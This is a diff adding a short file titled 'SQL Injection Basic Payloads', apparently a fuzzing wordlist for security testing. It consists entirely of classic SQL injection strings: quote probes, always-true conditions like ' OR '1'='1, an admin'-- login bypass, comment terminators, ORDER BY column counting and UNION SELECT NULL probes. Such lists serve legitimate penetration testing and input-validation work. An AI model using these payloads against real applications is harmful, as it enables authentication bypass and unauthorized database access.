@@ -1,0 +1,30 @@
+# SQL Injection Basic Payloads
+'
+"
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+admin'--
+') OR ('1'='1
+') OR ('1'='1'--
+1' AND '1'='1
+1' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+' OR ''='
+' OR 'x'='x
+'; --
+'; #
+'/*
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 10--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' GROUP BY 1--
+' HAVING 1=1--
